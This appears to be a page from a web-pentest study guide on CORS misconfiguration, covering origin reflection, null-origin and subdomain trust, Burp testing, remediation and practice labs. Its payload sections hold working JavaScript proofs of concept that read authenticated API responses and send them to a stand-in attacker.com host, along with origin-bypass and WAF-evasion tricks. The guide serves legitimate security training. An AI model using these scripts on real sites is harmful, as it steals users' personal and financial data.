@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="CORS misconfiguration testing guide: origin reflection bypass, null origin attacks, and cross-origin credential theft exploitation.">
+    <meta property="og:title" content="CORS Misconfiguration – Web App Pentesting Guide">
+    <meta property="og:description" content="CORS misconfiguration testing guide: origin reflection bypass, null origin attacks, and cross-origin credential theft exploitation.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>CORS Misconfiguration  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">CORS Misconfiguration</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#how-it-works">How It Works</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">Burp Workflow</a>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A05 · CVSS 6.5 · Day 3</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></span><span>CORS Misconfiguration</span></h1>
+      <p>Exploit misconfigured Cross-Origin Resource Sharing to steal sensitive data from authenticated sessions across origins.</p>
+      <div class="badge-row">
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-bscp">BSCP Exam Topic</span>
+        <span class="badge badge-difficulty">Difficulty: Beginner-Intermediate</span>
+      </div>
+    </div>
+
+    <!-- ═══ ANALOGY ═══ -->
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">The Forgetful Bouncer</div>
+        <p>Your house has a security policy: "Only let in people I've pre-approved." But you wrote it down as: "Let in anyone who says they know me" or "Let in whoever claims to be coming from my house." A social engineer shows up and says they're from your house, and the bouncer lets them in. They walk straight to your safe and steal your valuables. CORS misconfiguration works the same way: a website says "I trust requests from origin X" but dynamically reflects whatever origin you send, or trusts dangerously broad patterns. An attacker's website sends a request on behalf of your session, and because the target site trusts all origins (or reflects the attacker's origin), the response includes your sensitive data.</p>
+      </div>
+    </section>
+
+    <!-- ═══ METHODOLOGY ═══ -->
+    <h2 id="methodology">📅 When in the 5-Day Workflow</h2>
+
+    <div class="workflow-days">
+      <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+      <div class="day-pill"><span class="day-num">Day 2</span>Auth/IDOR</div>
+      <div class="day-pill deep"><span class="day-num">Day 3</span>Deep Dive</div>
+      <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+      <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+    </div>
+
+    <div class="callout method-deep">
+      <div class="callout-title">🎯 Day 3  · CORS Testing</div>
+      <p>On Day 3, test CORS on every API endpoint that returns user data. The attack only works when both conditions are true: <code>Access-Control-Allow-Origin</code> reflects/trusts your origin AND <code>Access-Control-Allow-Credentials: true</code> is set. Add an <code>Origin:</code> header to requests in Repeater and check the response:</p>
+      <pre><code># Test 1: arbitrary origin reflection
+Origin: https://evil.com
+→ Does response include: Access-Control-Allow-Origin: https://evil.com?
+→ AND: Access-Control-Allow-Credentials: true?
+
+# Test 2: null origin (sandboxed iframe bypass)
+Origin: null
+→ Does response allow null with credentials?
+
+# Test 3: subdomain trust + prefix/suffix regex flaws
+Origin: https://evil.target.com
+Origin: https://target.com.evil.com
+Origin: https://target.com.evil.com</code></pre>
+      <p>If both ACAO reflects and ACAC is true → build JavaScript PoC that fetches <code>/api/user</code> from an attacker page while including victim's cookies.</p>
+      <p><strong>Chain it:</strong> CORS + XSS on any trusted subdomain → steal authenticated API responses → account data exfiltration.</p>
+    </div>
+
+    <!-- ═══ HOW IT WORKS ═══ -->
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p><strong>Same-Origin Policy</strong> is a browser security boundary: scripts from one origin cannot access resources from another origin without explicit permission. <strong>CORS (Cross-Origin Resource Sharing)</strong> allows servers to explicitly permit cross-origin requests by sending specific HTTP headers.</p>
+
+      <h3>The CORS Handshake</h3>
+      <p>When a browser makes a cross-origin request (e.g., JavaScript on attacker.com fetching from victim.com), it:</p>
+      <ol>
+        <li>Sends a preflight request (OPTIONS) with the <code>Origin</code> header</li>
+        <li>The server responds with <code>Access-Control-Allow-Origin</code> and other CORS headers</li>
+        <li>If the response permits the origin, the browser allows the actual request</li>
+        <li>If the server includes <code>Access-Control-Allow-Credentials: true</code>, the browser sends cookies with the request</li>
+      </ol>
+
+      <h3>Key CORS Headers</h3>
+      <ul>
+        <li><strong>Access-Control-Allow-Origin (ACAO):</strong> Which origins can access the response. Values: specific origin, wildcard <code>*</code>, or <code>null</code></li>
+        <li><strong>Access-Control-Allow-Credentials (ACAC):</strong> Whether credentials (cookies, HTTP auth) are included. Values: <code>true</code> or <code>false</code></li>
+        <li><strong>Vary: Origin:</strong> Instructs caches to store separate responses per origin (if omitted, cache poisoning may occur)</li>
+        <li><strong>Access-Control-Allow-Methods:</strong> Which HTTP methods (GET, POST, etc.) are permitted</li>
+        <li><strong>Access-Control-Allow-Headers:</strong> Which custom headers are permitted</li>
+      </ul>
+
+      <h3>Vulnerability Pattern 1: Reflecting the Origin Header</h3>
+      <p>The server echoes whatever <code>Origin</code> header you send back in the <code>Access-Control-Allow-Origin</code> response header:</p>
+      <pre><code>// Request from attacker.com
+Origin: https://attacker.com
+
+// Response
+Access-Control-Allow-Origin: https://attacker.com
+Access-Control-Allow-Credentials: true
+
+// Result: Attacker's site can read authenticated responses</code></pre>
+
+      <h3>Vulnerability Pattern 2: Null Origin Trust</h3>
+      <p>The server trusts <code>ACAO: null</code>, which is sent by sandboxed iframes:</p>
+      <pre><code>// Sandboxed iframe sends
+Origin: null
+
+// Server responds
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+// Attacker uses sandboxed iframe to steal data</code></pre>
+
+      <h3>Vulnerability Pattern 3: Subdomain Wildcards</h3>
+      <p>The server trusts all subdomains without properly validating them:</p>
+      <pre><code>// Server trusts
+Access-Control-Allow-Origin: *.example.com
+
+// If XSS exists on any subdomain (cdn.example.com, mail.example.com),
+// attacker can steal data from example.com API endpoints</code></pre>
+
+      <h3>Vulnerability Pattern 4: Regex Flaws</h3>
+      <p>The server uses a flawed regex pattern to validate origins:</p>
+      <pre><code>// Regex: /allowed\.com$/
+// Attacker registers: evil-allowed.com or allowed.com.attacker.com
+// Both match the regex, bypassing CORS checks</code></pre>
+    </section>
+
+    <!-- ═══ WHERE TO LOOK ═══ -->
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>CORS vulnerabilities appear on API endpoints that handle sensitive data. Test every endpoint that returns user information:</p>
+
+      <h3>High-Value Targets</h3>
+      <ul>
+        <li><strong>Account/Profile APIs:</strong> <code>/api/user</code>, <code>/api/profile</code>, <code>/api/account</code></li>
+        <li><strong>Authentication APIs:</strong> <code>/api/auth/me</code>, <code>/api/whoami</code>, endpoints that return user identity</li>
+        <li><strong>Financial/Sensitive Data:</strong> <code>/api/transactions</code>, <code>/api/balance</code>, <code>/api/settings</code></li>
+        <li><strong>Admin APIs:</strong> Any endpoint protected by authentication that returns sensitive data</li>
+      </ul>
+
+      <h3>Testing Approach</h3>
+      <ol>
+        <li>Send a request to an API endpoint (e.g., <code>/api/user</code>)</li>
+        <li>In Burp Repeater, add an arbitrary <code>Origin: https://evil.com</code> header</li>
+        <li>Check the response for <code>Access-Control-Allow-Origin</code> and <code>Access-Control-Allow-Credentials</code> headers</li>
+        <li>If <code>ACAO: https://evil.com</code> AND <code>ACAC: true</code> appear, the endpoint is vulnerable</li>
+      </ol>
+
+      <h3>Red Flags</h3>
+      <ul>
+        <li><code>Access-Control-Allow-Origin: *</code> combined with <code>Access-Control-Allow-Credentials: true</code> (invalid combination, but server may still allow it)</li>
+        <li><code>Access-Control-Allow-Origin: null</code> (trusts sandboxed contexts)</li>
+        <li>The Origin header is reflected directly without validation</li>
+        <li>No <code>Vary: Origin</code> header (cache poisoning risk)</li>
+      </ul>
+    </section>
+
+    <!-- ═══ BURP WORKFLOW ═══ -->
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Identify API Endpoints</strong><br>
+          Use Burp's Proxy history or Scanner to identify API endpoints that return user data. Look for endpoints that require authentication and respond with JSON/sensitive data.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Send to Repeater</strong><br>
+          Select an API request and send it to Repeater (Ctrl+R). Observe the response headers and body. Note if the endpoint returns user data.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Modify the Origin Header</strong><br>
+          Add or modify the <code>Origin</code> header in the request. Try values like <code>https://attacker.com</code>, <code>https://evil.com</code>, or <code>null</code>. Resend the request.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Check Response Headers</strong><br>
+          Look at the response headers for <code>Access-Control-Allow-Origin</code> and <code>Access-Control-Allow-Credentials</code>. If ACAO reflects your origin and ACAC is true, the endpoint is vulnerable.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Create a PoC</strong><br>
+          Write JavaScript code that performs a cross-origin fetch to the vulnerable endpoint. Use Burp Collaborator or host the PoC on your domain to verify that the browser allows the cross-origin request and the response is accessible.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Test Subdomain and Regex Patterns</strong><br>
+          Try registering a subdomain or crafting origin values that might match regex patterns. Check if the server accepts non-whitelisted origins.
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══ PAYLOADS ═══ -->
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>Basic JavaScript PoC (Reflected Origin)</h3>
+      <p>Create an HTML file on your attacker domain that fetches data from the victim site:</p>
+
+      <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;CORS Test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+fetch('https://victim.com/api/user', {
+  method: 'GET',
+  credentials: 'include'  // Include cookies
+})
+.then(response =&gt; response.json())
+.then(data =&gt; {
+  // Send stolen data to attacker server
+  fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
+  console.log('Data stolen:', data);
+})
+.catch(err =&gt; console.error('Error:', err));
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+      <h3>Null Origin PoC (Sandboxed Iframe)</h3>
+      <p>If the server trusts <code>null</code> origin, use a sandboxed iframe:</p>
+
+      <pre><code>&lt;iframe sandbox="allow-scripts allow-same-origin" srcdoc="
+  &lt;script&gt;
+  fetch('https://victim.com/api/user', {credentials: 'include'})
+    .then(r =&gt; r.text())
+    .then(d =&gt; fetch('https://attacker.com/steal?data=' + btoa(d)));
+  &lt;/script&gt;
+"&gt;&lt;/iframe&gt;</code></pre>
+
+      <h3>Testing Origin Reflections</h3>
+      <p>Use Burp Repeater to test various origin values:</p>
+
+      <pre><code>// Test list
+Origin: https://attacker.com
+Origin: https://evil.com
+Origin: https://victim.com.attacker.com
+Origin: https://victim.com
+Origin: null
+Origin: https://victim.com:8080
+Origin: http://victim.com  (if site is HTTPS)
+Origin: https://*.victim.com  (wildcard attempt)
+Origin: *.victim.com</code></pre>
+
+      <h3>Subdomain Enumeration & Testing</h3>
+      <p>If the server trusts subdomains (*.victim.com), find subdomains with XSS vulnerabilities:</p>
+
+      <pre><code>// Use tools like:
+// - sublist3r, massdns, assetfinder for subdomain enumeration
+// - Test each subdomain for XSS
+// - Once XSS found on a subdomain, use it to steal data from main API
+
+// JavaScript on XSS-vulnerable subdomain (e.g., cdn.victim.com)
+fetch('https://api.victim.com/user', {credentials: 'include'})
+  .then(r =&gt; r.json())
+  .then(d =&gt; fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(d))));</code></pre>
+
+      <h3>Cache Poisoning (Missing Vary: Origin)</h3>
+      <p>If <code>Vary: Origin</code> is absent, a CDN may cache responses:</p>
+
+      <pre><code>// Request 1: From attacker.com (gets ACAO: attacker.com in response)
+// If response is cached without Vary: Origin,
+// Victim visits site, sees attacker's Origin in ACAO header
+// Browser may trust the response</code></pre>
+
+      <h3>Testing Regex Patterns</h3>
+      <p>If origin validation uses regex, test patterns that might bypass it:</p>
+
+      <pre><code>// If regex is: /allowed\.com$/
+Origin: https://evil-allowed.com  // Matches due to .com suffix
+Origin: https://allowed.com.attacker.com  // Matches due to allowed.com
+
+// If regex is: /^https:\/\/.*\.allowed\.com$/
+Origin: https://attacker.allowed.com  // Matches wildcard
+Origin: https://allowed.com  // Might not match (no subdomain)</code></pre>
+    </section>
+
+    <!-- ═══ CHECKLIST ═══ -->
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          <strong>CORS Misconfiguration Tests</strong>
+          <span class="progress-mini"><span>0</span>/11</span>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c1">
+          <label for="c1">Identify all API endpoints that return sensitive data (user info, transactions, etc.)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c2">
+          <label for="c2">Test each endpoint with Origin header set to an arbitrary domain (e.g., https://attacker.com)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c3">
+          <label for="c3">Check response for <code>Access-Control-Allow-Origin</code> and <code>Access-Control-Allow-Credentials</code></label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c4">
+          <label for="c4">Test if ACAO reflects the Origin header value (indicates reflection vulnerability)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c5">
+          <label for="c5">Test null origin (use Burp's "null" origin option or sandboxed iframe)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c6">
+          <label for="c6">Test subdomain wildcards if ACAO includes <code>*.domain.com</code> pattern</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c7">
+          <label for="c7">Enumerate subdomains and test for XSS to bypass subdomain trust</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c8">
+          <label for="c8">Test origin regex bypass (e.g., with subdomains, different protocols, ports)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c9">
+          <label for="c9">Create a PoC JavaScript file demonstrating successful cross-origin data theft</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c10">
+          <label for="c10">Check for <code>Vary: Origin</code> header (absence indicates cache poisoning risk)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c11">
+          <label for="c11">Test preflight requests (OPTIONS) to understand allowed methods and headers</label>
+        </div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+      </div>
+    </section>
+
+    <!-- ═══ WAF BYPASS ═══ -->
+    <section id="waf-bypass">
+      <h2>WAF Bypass & Variations</h2>
+
+      <h3>Origin Header Case Sensitivity</h3>
+      <p>Some WAFs check origin case-sensitively. Try variations:</p>
+      <ul>
+        <li><code>Origin: https://Attacker.com</code> (capital A)</li>
+        <li><code>Origin: HTTPS://attacker.com</code> (uppercase protocol)</li>
+      </ul>
+
+      <h3>Subdomain/Port Tricks</h3>
+      <ul>
+        <li>If WAF allows <code>*.victim.com</code>, try <code>victim.com:1.attacker.com</code> (port confusion)</li>
+        <li>Use different ports: <code>https://attacker.com:443</code> vs <code>http://attacker.com:80</code></li>
+        <li>Register a lookalike domain: <code>yictim.com</code> (typosquatting)</li>
+      </ul>
+
+      <h3>Unicode/URL Encoding</h3>
+      <p>Try URL-encoded or unicode-encoded origins (unlikely to work, but worth testing):</p>
+      <pre><code>Origin: https://attacker.com%00.victim.com
+Origin: https://attacker。com  (unicode dot)</code></pre>
+
+      <h3>Bypassing Regex Patterns</h3>
+      <p>If origin validation uses regex, test edge cases:</p>
+      <ul>
+        <li>Regex allows <code>victim.com</code> → try <code>victim.com.attacker.com</code></li>
+        <li>Regex allows subdomains → try <code>attacker.com.victim.com</code></li>
+        <li>Missing anchors → try <code>xvictim.comx</code></li>
+      </ul>
+
+      <h3>Protocol Downgrade</h3>
+      <p>If the site is HTTPS, try <code>http://</code> origin (if HTTP is still accessible):</p>
+      <pre><code>Origin: http://attacker.com  // If CORS checks are protocol-agnostic</code></pre>
+
+      <h3>XSS on Trusted Subdomain</h3>
+      <p>Instead of bypassing CORS directly, find XSS on a trusted subdomain and use that to steal data.</p>
+    </section>
+
+    <!-- ═══ EXPLOITATION ═══ -->
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Exploitation Scenarios</h3>
+
+      <h4>Stealing Session Cookies</h4>
+      <p>Use a cross-origin fetch with <code>credentials: 'include'</code> to steal authenticated session data:</p>
+
+      <pre><code>fetch('https://victim.com/api/user', {credentials: 'include'})
+  .then(r =&gt; r.json())
+  .then(data =&gt; {
+    // data contains sensitive user info: email, account balance, etc.
+  });</code></pre>
+
+      <h4>Account Takeover</h4>
+      <p>Steal a user's authentication token or session identifier, then use it to impersonate them on the victim site.</p>
+
+      <h4>Data Exfiltration</h4>
+      <p>Read user profiles, financial data, personal information, and send it to an attacker-controlled server:</p>
+
+      <pre><code>// PoC: Send stolen data to attacker
+.then(data =&gt; fetch('https://attacker.com/exfil', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify(data)
+}))</code></pre>
+
+      <h4>Privilege Escalation</h4>
+      <p>If you can steal an admin's session token or read admin APIs, you can escalate privileges or access restricted functionality.</p>
+
+      <h4>Cache Poisoning</h4>
+      <p>If <code>Vary: Origin</code> is missing and responses are cached, you can poison a CDN to serve attacker-controlled CORS headers to all users.</p>
+
+      <h3>Impact Assessment</h3>
+      <ul>
+        <li><strong>Critical:</strong> Stealing session tokens, authentication credentials, or personal data</li>
+        <li><strong>High:</strong> Reading user profiles, financial data, or private communications</li>
+        <li><strong>Medium:</strong> Reading metadata, cache poisoning, or information disclosure</li>
+      </ul>
+
+      <h3>Real-World Example</h3>
+      <p>A travel booking site stores user payment methods in <code>/api/payment-methods</code>. The endpoint is vulnerable to CORS misconfiguration (reflects Origin header). An attacker creates a malicious website that, when visited by a logged-in user, fetches their payment methods and sends them to the attacker's server. Within hours, dozens of users' payment data is compromised.</p>
+    </section>
+
+    <!-- ═══ REMEDIATION ═══ -->
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Whitelist Specific Origins (Never Reflect)</h3>
+      <p>Never echo the <code>Origin</code> header directly. Instead, check against a whitelist:</p>
+
+      <pre><code>const ALLOWED_ORIGINS = [
+  'https://example.com',
+  'https://app.example.com'
+];
+
+const origin = request.headers.get('Origin');
+if (ALLOWED_ORIGINS.includes(origin)) {
+  response.headers.set('Access-Control-Allow-Origin', origin);
+}</code></pre>
+
+      <h3>2. Don't Trust Wildcard + Credentials</h3>
+      <p>Never use <code>Access-Control-Allow-Origin: *</code> together with <code>Access-Control-Allow-Credentials: true</code>. The browser will reject this combination.</p>
+
+      <h3>3. Add Vary: Origin</h3>
+      <p>Always include this header to prevent cache poisoning:</p>
+
+      <pre><code>Access-Control-Allow-Origin: https://example.com
+Vary: Origin</code></pre>
+
+      <h3>4. Avoid Wildcard Subdomains</h3>
+      <p>Instead of <code>ACAO: *.example.com</code>, list specific subdomains or validate strictly.</p>
+
+      <h3>5. Validate Origin with Proper Regex</h3>
+      <p>If using regex, ensure proper anchoring and escaping:</p>
+
+      <pre><code>// Good: Anchored regex with escape
+const originRegex = /^https:\/\/([\w-]+\.)?example\.com$/;
+
+// Bad: No anchors, vulnerable to bypass
+const originRegex = /example\.com/;</code></pre>
+
+      <h3>6. Disable CORS if Not Needed</h3>
+      <p>If an API endpoint doesn't require cross-origin access, don't send CORS headers at all.</p>
+
+      <h3>7. Require Same-Site Cookies</h3>
+      <p>Set <code>SameSite=Strict</code> or <code>SameSite=Lax</code> on session cookies to limit CSRF/CORS attacks:</p>
+
+      <pre><code>Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly</code></pre>
+
+      <h3>8. Use CORS Middleware Properly</h3>
+      <p>Libraries like <code>cors</code> (Node.js) require explicit configuration. Never use defaults in production:</p>
+
+      <pre><code>// Good: Explicit whitelist
+const cors = require('cors');
+app.use(cors({
+  origin: ['https://example.com', 'https://app.example.com'],
+  credentials: true
+}));
+
+// Bad: Wildcard (if credentials needed)
+app.use(cors());</code></pre>
+    </section>
+
+    <!-- ═══ LABS ═══ -->
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>PortSwigger Web Security Academy includes approximately 4 CORS labs:</p>
+      <ul>
+        <li>CORS vulnerability with basic origin reflection</li>
+        <li>CORS vulnerability with trusted null origin</li>
+        <li>CORS vulnerability with trusted subdomain wildcard</li>
+        <li>CORS vulnerability with authentication bypass via origin parsing</li>
+      </ul>
+      <p>Complete these labs to practice identifying CORS vulnerabilities, crafting PoCs, and understanding origin validation flaws. Focus on recognizing when ACAO headers are unsafe and how to exploit them via JavaScript.</p>
+    </section>
+
+    <!-- ═══ COMMON MISTAKES ═══ -->
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <h3>Not Checking ACAC Header</h3>
+      <p><strong>Mistake:</strong> Testing ACAO but ignoring <code>Access-Control-Allow-Credentials</code>.</p>
+      <p><strong>Fix:</strong> Both headers must be present for cookie-based CORS attacks. If ACAC is false/absent, you can't steal authenticated data.</p>
+
+      <h3>Testing Without Credentials</h3>
+      <p><strong>Mistake:</strong> Using <code>fetch(url)</code> instead of <code>fetch(url, {credentials: 'include'})</code> in your PoC.</p>
+      <p><strong>Fix:</strong> Always include <code>credentials: 'include'</code> when testing. Without it, cookies aren't sent.</p>
+
+      <h3>Only Testing GET Requests</h3>
+      <p><strong>Mistake:</strong> Assuming POST endpoints aren't vulnerable to CORS.</p>
+      <p><strong>Fix:</strong> Test all HTTP methods (GET, POST, PUT, DELETE, PATCH). API endpoints often accept multiple methods.</p>
+
+      <h3>Giving Up on Regex Testing</h3>
+      <p><strong>Mistake:</strong> Testing only direct origin values and not fuzzing subdomain/port patterns.</p>
+      <p><strong>Fix:</strong> Methodically test variations: subdomains, ports, different protocols, unicode, URL encoding.</p>
+
+      <h3>Not Monitoring Outbound Connections**</h3>
+      <p><strong>Mistake:</strong> Creating a PoC but not using Burp Collaborator or server logs to verify data theft.</p>
+      <p><strong>Fix:</strong> Always monitor your attacker server to confirm stolen data is received. Use Burp Collaborator for blind verification.</p>
+
+      <h3>Overlooking Cache Poisoning**</h3>
+      <p><strong>Mistake:</strong> Reporting CORS misconfiguration as a simple data leak, missing cache poisoning risks.</p>
+      <p><strong>Fix:</strong> Check for <code>Vary: Origin</code> header. If absent, note cache poisoning as an amplified impact.</p>
+
+      <h3>Not Testing Null Origin**</h3>
+      <p><strong>Mistake:</strong> Assuming null origin is rare and not testing it.</p>
+      <p><strong>Fix:</strong> Always test with <code>Origin: null</code> and sandboxed iframes. Some sites explicitly trust null.</p>
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>CORS misconfigurations become critical when combined with client-side vulnerabilities.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="xss.html"><span class="sa-icon">⚡</span><span class="sa-name">XSS</span><span class="sa-why">XSS on any trusted subdomain completely bypasses CORS restrictions  · attacker can make cross-origin API calls as the victim.</span></a>
+      <a class="see-also-card" href="csrf.html"><span class="sa-icon">🎭</span><span class="sa-name">CSRF</span><span class="sa-why">Both exploit the browser's request-sending behavior. CORS lets you READ the response; CSRF lets you WRITE state  · together they're devastating.</span></a>
+      <a class="see-also-card" href="oauth.html"><span class="sa-icon">🔗</span><span class="sa-name">OAuth</span><span class="sa-why">CORS on an OAuth token endpoint leaks access tokens to attacker origins. Combine with redirect_uri bugs.</span></a>
+      <a class="see-also-card" href="host-header.html"><span class="sa-icon">🏷️</span><span class="sa-name">Host Header</span><span class="sa-why">Some apps use the Host header to determine allowed CORS origins  · a Host header injection can bypass the CORS check.</span></a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) document.querySelectorAll('#sidebar a').forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('[id]').forEach(s => observer.observe(s));
+const SK = 'cors-cl-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  if (localStorage.getItem(SK+i) === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(SK+i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
